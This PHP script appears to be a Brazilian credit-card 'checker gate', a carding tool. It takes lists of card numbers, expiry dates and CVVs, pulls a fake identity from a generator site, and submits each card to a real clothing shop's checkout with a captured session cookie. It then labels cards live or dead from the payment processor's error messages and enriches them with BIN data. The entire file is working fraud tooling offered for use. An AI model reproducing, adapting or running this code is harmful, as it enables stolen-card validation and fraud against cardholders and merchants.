<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

extract($_GET);

function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$separador = explode("|", $lista);
$cc = trim($separador[0]);


$cctwo = substr("$cc", 0, 6);




function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","Â»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

if($ano == 2019){  //QUANDO O ANO DO GATE NÃƒO TIVER 20, USE ESSA FUNÃ‡ÃƒO '.$ano1.'
$ano1 = "19";
}else if($ano == 2020){
$ano1 = "20";
}else if($ano == 2021){
$ano1 = "21";
}else if($ano == 2022){
$ano1 = "22";
}else if($ano == 2023){
$ano1 = "23";
}else if($ano == 2024){
$ano1 = "24";
}else if($ano == 2025){
$ano1 = "25";
}else if($ano == 2026){
$ano1 = "26";
}else if($ano == 2027){
$ano1 = "27";
}else if($ano == 2028){
$ano1 = "28";
}else if($ano == 2029){
$ano1 = "29";
}else if($ano == 2030){
$ano1 = "30";
}else if($ano == 2031){
$ano1 = "31";
}else{
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> Validade Invalida</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}

/*if($cc[0]==4){ //QUANDO VOCÃŠ NÃƒO QUISER QUE TESTE UMA TAL GERADA NO GATE
'<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==5){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==3){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==2){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==1){
     '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//=========================================//4 DEVS PHP//=========================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
$email = mt_rand();

//=========================================//PEGAR AS REQUEST DO TOKEN DO SITE//=========================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.malhariarose.com.br/pedido_finalizado.aspx?erro=true&p=lowGx9bxtUw%3d&mensagem=Unauthorized.+Invalid+security+code.');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.malhariarose.com.br',
'content-length: 7437',
'cache-control: no-cache',
'x-requested-with: XMLHttpRequest',
'x-microsoftajax: Delta=true',
'save-data: on',
'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'accept: */*',
'origin: https://www.malhariarose.com.br',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.malhariarose.com.br/pedido_finalizado.aspx?erro=true&p=lowGx9bxtUw=&mensagem=Unauthorized.%20Invalid%20security%20code.',

'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie: _ga=GA1.3.1763427114.1591993668;_gid=GA1.3.1704750843.1591993668;cliente=id=rXsfpRZDj2o=&nome=NJfxJlo4jG9hH4/MKvfwAQ==&email=ALVMOWJz/RrDH7v9X23InkXUp1XQLU4afVtzceCOSmQ=;ASP.NET_SessionId=jfmx42kukinr3xzpeqvz3jmg;Visitante_Id_2=179.222.16.239.572;acesso=acesso=ArqZeaj+Y/x5uNIaSnEU75QUbslwkIBj;_gat_gtag_UA_60152352_1=1',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ctl00%24ScriptManager1=ctl00%24AreaCentral%24updatePanel2%7Cctl00%24AreaCentral%24btnPagar&ctl00%24ctl18%24edtWidget_Id=9523876&ctl00%24ctl18%24edtWidget_Nome=&ctl00%24ctl18%24edtWidget_Template=&ctl00%24ctl18%24busca%24edtProcurar=&ctl00%24AreaCentral%24edtCartao_Numero='.$cc.'&ctl00%24AreaCentral%24edtCartao_Cod='.$cvv.'&ctl00%24AreaCentral%24edtCartao_Mes='.$mes.'&ctl00%24AreaCentral%24edtCartao_Ano='.$ano.'&ctl00%24AreaCentral%24lstCartao_Parcela=1&ctl00%24AreaCentral%24edtCartao_Nome=Paulo%20S Santos&ctl00%24AreaCentral%24edtCartao_DataNascimento=08%2F09%2F1982&ctl00%24AreaCentral%24edtCartao_CPF=&ctl00%24AreaCentral%24edtCartao_Telefone=&ctl00%24AreaCentral%24edtCobranca_Cep=&ctl00%24AreaCentral%24edtCobranca_Cidade=&ctl00%24AreaCentral%24lstCobranca_Estado=&ctl00%24AreaCentral%24edtCobranca_Rua=&ctl00%24AreaCentral%24edtCobranca_Numero=&ctl00%24AreaCentral%24edtCobranca_Bairro=&ctl00%24AreaCentral%24edtCobranca_Complemento=&ctl00%24AreaCentral%24edtPedido_ValorTotal=R%24123%2C00&ctl00%24AreaCentral%24edtSubmit=1&ctl00%24AreaCentral%24edtCartao=visa&ctl00%24AreaCentral%24edtCartao_Token=&ctl00%24AreaCentral%24edtSenderHash=6fd0b0e6ed2ed24f0c7a56df36a2a63fde1bce8afe1f3f9b0a382a8ee7ed1162&ctl00%24AreaCentral%24edtBanco_Codigo=&ctl00%24AreaCentral%24edtPedido_Tipo=1&ctl00%24AreaCentral%24edtPagamento_Id=8&ctl00%24AreaCentral%24edtMoip_Forma=&ctl00%24AreaCentral%24edtMoip_Instituicao=&ctl00%24AreaCentral%24edtMoip_Status=&ctl00%24AreaCentral%24edtMoip_CodigoMoIP=&ctl00%24AreaCentral%24edtMoip_CodigoRetorno=&ctl00%24AreaCentral%24edtMoip_Token=&ctl00%24ctl21%24edtWidget_Id=9523877&ctl00%24edtProcurar=&ctl00%24popup%24edtassinante_nome=&ctl00%24popup%24edtassinante_email=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTY5ODU1Mzk0Mw8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgJmD2QWBAIBD2QWBgIUDxYCHgRocmVmBRgvd2lkZ2V0LmNzcz9wYWdpbmFfaWQ9MTBkAhwPFgIeBFRleHQFugI8IS0tIEdsb2JhbCBzaXRlIHRhZyAoZ3RhZy5qcykgLSBHb29nbGUgQW5hbHl0aWNzIC0tPgo8c2NyaXB0IGFzeW5jIHNyYz0iaHR0cHM6Ly93d3cuZ29vZ2xldGFnbWFuYWdlci5jb20vZ3RhZy9qcz9pZD1HQV9UUkFDS0lOR19JRCI%2BPC9zY3JpcHQ%2BCjxzY3JpcHQ%2BCiAgd2luZG93LmRhdGFMYXllciA9IHdpbmRvdy5kYXRhTGF5ZXIgfHwgW107CiAgZnVuY3Rpb24gZ3RhZygpe2RhdGFMYXllci5wdXNoKGFyZ3VtZW50cyk7fQogIGd0YWcoJ2pzJywgbmV3IERhdGUoKSk7CgogIGd0YWcoJ2NvbmZpZycsICdVQS02MDE1MjM1Mi0xJyk7Cjwvc2NyaXB0PmQCHQ8WAh8CBV48bWV0YSBuYW1lPSJnb29nbGUtc2l0ZS12ZXJpZmljYXRpb24iIGNvbnRlbnQ9IllBcTcxdmkzb3J1dkFtajgyYXdNU1dmY1N6bTlhWWlVX2RVR3ppQl9NT28iIC8%2BZAIDDxYCHghpdGVtdHlwZQUfaHR0cDovL3NjaGVtYS5vcmcvQ2xvdGhpbmdTdG9yZRYCAgEPZBYKAgEPDxYCHwIFkwQ8ZGl2IGNsYXNzPSJmdWxsLXdpZHRoIj4NCiAgICA8ZGl2IGNsYXNzPSJjYWJlY2FsaG8iPjxkaXYgY2xhc3M9ImFyZWEiIGlkPSJhcmVhLTEiPiMjQEBjYWJlY2FsaG8tQXJlYS0xIyM8L2Rpdj48L2Rpdj4NCjwvZGl2Pg0KDQogPGRpdiBjbGFzcz0iY29udGVudC1jZW50ZXIgZnVsbC13aWR0aCI%2BDQogICAgPGRpdiBjbGFzcz0nY29udGV1ZG8gY29udGVudC1wdXNoJz4NCiAgICAgICAgPGRpdiBjbGFzcz0ncm93Jz4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFyZWEgY29sLW1kLTEyIiBpZD0iYXJlYS0xIj4NCiAgICAgICAgICAgICAgICAjI0BAY29udGV1ZG8tYXJlYS0xIyMgDQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY%2BDQogICAgPC9kaXY%2BDQoNCjwvZGl2PjxkaXYgY2xhc3M9InJvZGFwZS1jb250ZW50IGNvbnRlbnQtY2VudGVyIj4NCg0KICAgIDxkaXYgY2xhc3M9InJvZGFwZSI%2BPGRpdiBjbGFzcz0iYXJlYSIgaWQ9ImFyZWEtMSI%2BIyNAQHJvZGFwZS1BcmVhLTEjIzwvZGl2PjwvZGl2Pg0KDQo8L2Rpdj5kZAIJD2QWAmYPZBYCAgUPZBYCAgEPZBYGAgEPFgIeB1Zpc2libGVoFgpmDxYCHwIFBDUwNTJkAgEPFgIfAgUPUm9iZXJ0YSBQYWNoZWNvZAICDxYCHwIFEENhcnTDo28gdmlhIFJFREVkAgQPFgIfAgUyPGkgY2xhc3M9J2ZhIGZhLWNsb2NrLW8nPjwvaT4gQWd1YXJkYW5kbyBwYWdhbWVudG9kAgUPFgIfAgUIUiQxMjMsMDBkAgMPZBYCAgEPEGRkFgFmZAIHDxYCHwRnFgQCDQ9kFgJmD2QWAgIBDxBkEBUFCVNlbGVjaW9uZRgxIHggUiQxMjMsMDAgLSBzZW0ganVyb3MXMiB4IFIkNjEsNTAgLSBzZW0ganVyb3MXMyB4IFIkNDEsMDAgLSBzZW0ganVyb3MXNCB4IFIkMzAsNzUgLSBzZW0ganVyb3MVBQEwATEBMgEzATQUKwMFZ2dnZ2dkZAIlDxYCHwIFCFIkMTIzLDAwZAITD2QWBAIBDxYCHwIFzgQ8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hcGlzLmdvb2dsZS5jb20vanMvcGxhdGZvcm0uanM%2Fb25sb2FkPXJlbmRlck9wdEluIiBhc3luYyBkZWZlcj48L3NjcmlwdD4KCjxzY3JpcHQ%2BCiAgd2luZG93LnJlbmRlck9wdEluID0gZnVuY3Rpb24oKSB7CiAgICB3aW5kb3cuZ2FwaS5sb2FkKCdzdXJ2ZXlvcHRpbicsIGZ1bmN0aW9uKCkgewogICAgICB3aW5kb3cuZ2FwaS5zdXJ2ZXlvcHRpbi5yZW5kZXIoCiAgICAgICAgewogICAgICAgICAgLy8gUkVRVUlSRUQgRklFTERTCiAgICAgICAgICAibWVyY2hhbnRfaWQiOiA4MzYyMzI2LAogICAgICAgICAgIm9yZGVyX2lkIjogIk9SREVSX0lEIiwKICAgICAgICAgICJlbWFpbCI6ICJDVVNUT01FUl9FTUFJTCIsCiAgICAgICAgICAiZGVsaXZlcnlfY291bnRyeSI6ICJDT1VOVFJZX0NPREUiLAogICAgICAgICAgImVzdGltYXRlZF9kZWxpdmVyeV9kYXRlIjogIllZWVktTU0tREQiLAoKICAgICAgICAgIC8vIE9QVElPTkFMIEZJRUxEUwogICAgICAgICAgInByb2R1Y3RzIjogW3siZ3RpbiI6IkdUSU4xIn0sIHsiZ3RpbiI6IkdUSU4yIn1dCiAgICAgICAgfSk7CiAgICB9KTsKICB9Cjwvc2NyaXB0PmQCAw8WAh8CBZcEPHNjcmlwdD4NCi8qIEPDs2RpZ28gZGUgYWNvbXBhbmhhbWVudG8gcGFyYSBlLWNvbW1lcmNlIGRvIEdBLkpTICovDQpnYSgncmVxdWlyZScsICdlY29tbWVyY2UnKTsNCmdhKCdlY29tbWVyY2U6YWRkVHJhbnNhY3Rpb24nLCB7CiAgJ2lkJzogJzUwNTInLCAgICAgICAgICAgICAgICAgIAogICdhZmZpbGlhdGlvbic6ICdNYWxoYXJpYSBSb3NlJywKICAncmV2ZW51ZSc6ICcxMjMnLCAKICAnc2hpcHBpbmcnOiAnMCcsIAogICd0YXgnOiAnMCcgICAgICAgICAgICAgCiAgJ2N1cnJlbmN5JzogJ0JSTCcgICAgICAKfSk7DQpnYSgnZWNvbW1lcmNlOmFkZEl0ZW0nLCB7CiAgJ2lkJzogJzI0NzM4JywgICAgICAgICAgICAgICAKICAnbmFtZSc6ICdCbHVzYSBSZW5kYWRhIG1hbmdhIEZsYXJlJywgCiAgJ3NrdSc6ICc0MTYgICAgICAgICAgICAgICAgICcsIAogICdjYXRlZ29yeSc6ICcnLCAgICAgICAgIAogICdwcmljZSc6ICc0OCwwMCcsIAogICdxdWFudGl0eSc6ICcxJyAgCn0pOw0KZ2EoJ2Vjb21tZXJjZTpzZW5kJyk7DQo8L3NjcmlwdD4NCmQCGQ8WAh8CZWQCHQ9kFgJmD2QWBgIHD2QWAmYPZBYCAgEPZBYCAgMPEGRkFgFmZAIND2QWAgICDxYCHwRnZAIPD2QWAmYPZBYCAgEPZBYEAgEPDxYCHwIFBlIkMCwwMGRkAgMPDxYCHwIFATBkZGTy4Kgzo0gN1QnIiClIC0a2hCFeh%2BHnMhRuD57a5gQRlQ%3D%3D&__VIEWSTATEGENERATOR=281EEBEE&__EVENTVALIDATION=%2FwEdAE4lV3YOTQKnqsiMAaWioLk%2BORGbfX8h1qhgEEgjZPjKhyAru15sdqVS%2Ft5npAj%2BhtxED0mgyQl4jiMvMTEtI4hjlFq57hkVggAW4KT%2FOxfJHXPdiBDrJAXKOXCHi%2B0CT%2F8%2FZLJ42qF6ljndgbSA3nBJGKCqJGUnobmSoTgQv%2Fwn6Zk8teggjiUhbtmkTk7YcNHhzCt8ua5lHsVF7lhA%2FsPtQl1YiVnvTPPTMZKcOn%2Fz8IEzBqJQckgYZRfBqwvqMGFbeiv4WqnNkFhzu4M71nvuw%2BiIUBABXmpNK9qZ4mGRZJW9u1n8WVFi3RFKVlQHtW%2BzMRjCvSRlkO4NTSS9wo5N6V4S9G7EZ30YaL9SKtfNJok2ezXQhjIFHEtUGp%2Fpq0uiDGVklSMyRAW9JlPQUi4AbaX0lOzfvyx9oekzKs1Yb22%2Bvcq1GNHR6hnFMVeYpt2MkEm7tTnUz3AUieFa16L8i0cPBDdOJLoscYMnRJvmnUlkB0fYNgkvf7DlF4jaoL6D3%2BO2ejLOzzgdQRh9MnnsBVVolUHFWVSixowrvLCNU%2BOtUhVQs6b5QThiA09ciPGliDx%2FH8lcPEytRVkB9u0Mudc8q4Vbcfoa2qMxWAY9plxmN7kN75WRer9%2BjhdaIGeCq2KhkYLom%2F%2BzKnVWRxqo%2FAxoYNfe6dK9x6JelISrcf00%2BM69jMCknng1FLEx4P%2BfNz1Ign6flbYtywOn2AuddaaCRK%2F8QXPIhB4zYY6d1SuhYz5bEIpLOT3dhvcMmnQ9ucjKywYA70XPZhd1AOpQnwmbkhZeCs5VUelA1cLzNz7%2BHcY5njip3le%2BxTU654tLb5YkYCGq%2FvFdffJrDX0FwbIQTN8HdfeyKwEK1%2FhjyIkBCvUzboEHjNptzkRqMcGL4Pz3X4tkH6ijz679bnuKXmw8Y7bcW00jZ4uowRotnBrjmE6eD6KAAHMih2MwgI8dlL4HvDrXLAM6PRK2%2FJhB4R1tDQ6vtdkLasrw0ZUxdfGPw%2F9w%2FfMKFg0oR57iD7VLQP6f1ljwO6jofCwV9Y9%2BKsZg%2B62xCe6g0mRu1M0KUo94f5adB5kO6LjQJUvSII39pLoE3XgrKWRDDpv%2BZb%2BRDZRSvBVe80ct1KZTMznBq35ZEEKLEWGf803vjurHQohuwR9DmV3ZrITSY%2FRVmrcy%2BCaxD64U77MA24sZT0dj7FGSmArXIfhqZYipbI7vWKiDpDO%2FjJGi4xyAe9dsbpW97X77pmZWoLl8dhWba7JhR1dFAMuuoANq5%2FmHNwsBHlkb28M5cLOLxePJq52Fwll9rDxV3Dvle2PLNK09yXLKRLFHriIGwPfW4NFPBYTuBHLK6%2Fi%2FmE8fFrvgpV1vlgRA91EvZm0pl%2FwvGvvNls2kiwXBGp%2FDzKYOlRivtCK0nFLeo1VI2snyRtDTQhHFBaLrNKxvENVC2eZyXX9khX532wgDw5uCPeJ9LgtpHB%2BKlvvJksek7qIA90o4aBirP3rws2QQ%2FIum8cGtqz22u8ObwJjKjfPapnH53kVz9VdG7flut%2BZYnpBKn9Qi%2F6L8M9qzFY3DsLdomcbl20%2FPyffYdu%2Bz4rs5Q%2FlbiMtGst3aEQcxLJsm%2FLDTivjMt6j0UgIhePFyNG08LXRcqBp5iZfbx%2BtjRrRTa%2B2HvapLsyJ0Gdy2sJzmNDJdY%2BBHWJcVZsE7DVMrywFygeOQ6V%2FvmyIWhQ%3D%3D&__ASYNCPOST=true&ctl00%24AreaCentral%24btnPagar=aguarde...');
$retorn = curl_exec($ch);



$bin = substr($cc, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
$pais = $pieces[4];
$paiscode = $pieces[5];
$banco = $pieces[2];
$level = $pieces[3];
$bandeira = $pieces[1];
} else {
$pais = $pieces[5];
$paiscode = $pieces[6];
$level = $pieces[4];
$banco = $pieces[2];
$bandeira = $pieces[1];
}

if (strpos($retorn, 'Unauthorized. Please try again.') !== false) {
echo
"APROVADA $lista|$bin  Retorno: Please try again (GERADA MASTER LIVE) #fredoapp";

}elseif (strpos($retorn, 'Unauthorized. Invalid security code.') !== false) {
echo
"APROVADA $lista|$bandeira|$banco|$level|$pais Retorno: Invalid security code. #fredo.app";


}elseif (strpos($retorn, 'Success') !== false) {
	
echo "APROVADA $lista|$bandeira|$banco|$level|$pais  Retorno: CVV ENCONTRADO. #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Restricted card.') !== false) {
echo
"REPROVADA $lista|$bandeira|$banco|$level|$pais  Retorno: Cartão Restrito.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Nonexistent card.') !== false) {
echo "REPROVADA $lista|$bandeira|$banco|$level|$pais  Retorno: Cartão não existente.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Transaction type not allowed for this card.') !== false) {

echo "REPROVADA $lista|$bandeira|$banco|$level|$pais  Transação não permitida.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Value not allowed for this type of card.') !== false) {
	
echo
"APROVADA $lista|$bandeira|$banco|$level|$pais   Retorno: Cartão com saldo baixo, porém live  #fredo.app";


}elseif (strpos($retorn, 'Unauthorized. Expiry date expired.') !== false) {
	
echo "REPROVADA $lista|$bandeira|$banco|$level|$pais   Retorno: Cartão com a validade vencida ou expirada  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Card locked.') !== false) {

echo "REPROVADA $lista|$bandeira|$banco|$level|$pais  Retorno: Cartão bloqueado, um dia útil #fredo.app";
 }
else{
echo "REPROVADA $lista|$bandeira|$banco|$level|$pais   Error.";

}

?>